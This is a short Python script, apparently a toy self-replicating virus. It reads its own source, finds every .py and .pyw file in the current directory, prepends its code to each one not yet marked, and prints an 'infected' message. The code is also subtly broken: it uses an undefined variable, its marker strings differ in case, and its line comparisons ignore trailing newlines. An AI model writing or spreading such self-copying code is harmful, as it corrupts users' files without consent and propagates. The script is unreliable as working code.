import sys
import glob

fun_code = []
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()
self_replicating_part = False
for line in lines:
    if line == '# Fun says HI!':
        self_replicating_part = True
    if not self_replicating_part:
        fun_code.append(line)
    if line == '# FUN SAYS BYE!':
        break
python_files = glob.glob('*.py') + glob.glob('*.pyw')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()
    Tested = False

    for line in file_code:
        if line == '# FUN SAYS HI!':
            Tested = True
            break
    if not Tested:
        final_code = []
        final_code.extend(_code)
        final_code.extend('\n')  # Corrected here
        final_code.extend(file_code)
        with open(file, 'w') as f:
            f.writelines(final_code)


def malicious_code():
    print('YOU HAVE BEEN INFECTED HAHAHA !!!')


malicious_code()
